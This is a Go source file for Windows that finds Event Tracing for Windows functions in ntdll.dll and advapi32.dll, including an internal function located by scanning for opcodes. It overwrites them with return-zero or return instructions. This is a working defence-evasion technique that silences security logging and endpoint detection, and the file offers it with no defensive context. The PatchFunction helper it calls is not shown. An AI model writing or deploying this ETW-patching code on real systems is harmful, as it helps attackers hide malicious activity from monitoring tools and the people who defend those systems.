package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

func FetchEtwpEventWriteFull() uintptr {
    x64_RET_INSTRUCTION_OPCODE := 0xC3
    x64_INT3_INSTRUCTION_OPCODE := 0xCC
    x64_CALL_INSTRUCTION_OPCODE := 0xE8
    NTDLL := windows.NewLazyDLL("ntdll.dll")

	procEtwEventWriteFull := NTDLL.NewProc("EtwEventWrite")
    pEtwEventWriteFullAddress := procEtwEventWriteFull.Addr()
    fmt.Println(fmt.Sprintf("EtwEventWrite %0X", pEtwEventWriteFullAddress))

    i := 0
    address := pEtwEventWriteFullAddress
    addressPlusOne := pEtwEventWriteFullAddress + uintptr(i+1)*uintptr(unsafe.Sizeof(byte(0)))
    for {
        // CHeck Opcode
        opcode := *(*byte)(unsafe.Pointer(address))
        fmt.Println(fmt.Sprintf("Opcode %0X", opcode))
        opcodePlusOne := *(*byte)(unsafe.Pointer(addressPlusOne))
        fmt.Println(fmt.Sprintf("Opcode+1 %0X", opcodePlusOne))
        if opcode == byte(x64_RET_INSTRUCTION_OPCODE) && opcodePlusOne == byte(x64_INT3_INSTRUCTION_OPCODE){
            addresdebug := pEtwEventWriteFullAddress + uintptr(i)*uintptr(unsafe.Sizeof(byte(0)))
            fmt.Println(fmt.Sprintf("Found ret address at %0x", addresdebug))
            break
        }

        // INcrement address
        i++
        address = pEtwEventWriteFullAddress + uintptr(i)*uintptr(unsafe.Sizeof(byte(0)))
        addressPlusOne = pEtwEventWriteFullAddress + uintptr(i+1)*uintptr(unsafe.Sizeof(byte(0)))
    }

    var callAddress uintptr
    for i > 0 {
        addressAtI := pEtwEventWriteFullAddress + uintptr(i)*uintptr(unsafe.Sizeof(byte(0)))
        opcodeAtI := *(*byte)(unsafe.Pointer(addressAtI))
        if opcodeAtI == byte(x64_CALL_INSTRUCTION_OPCODE) {
            callAddress = addressAtI
            fmt.Println(fmt.Sprintf("Found call address at %0x", callAddress))

            break
        }
        i--
    }

    // Skip Call address
    callAddress = callAddress + uintptr(1)
    dwOffset := *(*uint32)(unsafe.Pointer(callAddress))

    pEtwEvenFunc := callAddress + uintptr(dwOffset) + uintptr(unsafe.Sizeof(uint32(0)))

    return pEtwEvenFunc


}


func PatchEtw() error {
    pEtw := FetchEtwpEventWriteFull()
    pShellcode := []byte{0x33, 0xC0,0xC3}

    return PatchFunction(pEtw, pShellcode)

}

func PatchEtw2() error {
    NTDLL := windows.NewLazyDLL("ntdll.dll")
	pEtw := NTDLL.NewProc("EtwEventWrite").Addr()
    pShellcode := []byte{0x33, 0xC0,0xC3}

    err := PatchFunction(pEtw, pShellcode)
    if err != nil {
        return err
    }

	pEtw = NTDLL.NewProc("EtwEventWriteFull").Addr()
    err = PatchFunction(pEtw, pShellcode)
    if err != nil {
        return err
    }

	pEtw = NTDLL.NewProc("EtwEventWriteEx").Addr()
    return PatchFunction(pEtw, pShellcode)

}

func PatchEtw3() error {
    ADVAPI32DLL := windows.NewLazyDLL("advapi32.dll")
	pEtw := ADVAPI32DLL.NewProc("EventWrite").Addr()
    pShellcode := []byte{0x33, 0xC0,0xC3}

    err := PatchFunction(pEtw, pShellcode)
    if err != nil {
        return err
    }

	pEtw = ADVAPI32DLL.NewProc("EventWriteEx").Addr()
    return PatchFunction(pEtw, pShellcode)

}


func PatchEtw4() error {
    NTDLL := windows.NewLazyDLL("ntdll.dll")
	pEtw := NTDLL.NewProc("NtTraceEvent").Addr()
    pShellcode := []byte{0xC3}
    return PatchFunction(pEtw, pShellcode)
}
